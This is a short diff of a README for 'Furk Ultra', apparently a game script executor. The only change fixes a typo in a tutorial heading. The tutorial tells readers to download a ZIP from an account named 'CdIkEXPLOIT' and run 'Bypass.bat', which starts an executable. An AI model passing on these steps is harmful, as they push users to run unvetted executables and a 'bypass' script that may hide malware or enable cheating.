@@ -5,7 +5,7 @@ Furk Ultra is a executor with a built in scripts
 
  **Click [here](https://github.com/CdIkEXPLOIT/Furk-Ultra/archive/refs/heads/main.zip) to download**
 
-# 📁 〢 Tuturiol
+# 📁 〢 Tutorial
 1) Download the [Furk Ultra](https://github.com/CdIkEXPLOIT/Furk-Ultra/archive/refs/heads/main.zip)
 3) Extract the ZIP file
 4) Run the Bypass.bat (it automatically runs the FurkUltra.exe)
